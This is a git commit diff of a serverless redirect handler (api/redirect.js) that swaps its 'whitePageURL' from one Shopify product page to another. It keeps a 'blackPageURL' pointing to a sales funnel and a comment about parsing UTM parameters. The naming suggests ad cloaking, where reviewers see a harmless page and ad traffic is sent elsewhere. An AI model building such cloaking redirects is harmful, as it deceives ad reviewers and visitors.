57163d3c505cddc9072dc0efe9b69ec26d1e29d1
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-02-02 11:02:53 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://thesimpleway.myshopify.com/collections/tshirts/products/unisex-jersey-short-sleeve-tee";
+    const whitePageURL = "https://handal-store-demo.myshopify.com/products/katie-backpack?variant=34497394802837";
     const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1736979042571105-1738006308191131";
   
     // Parse the UTM parameters from the request URL
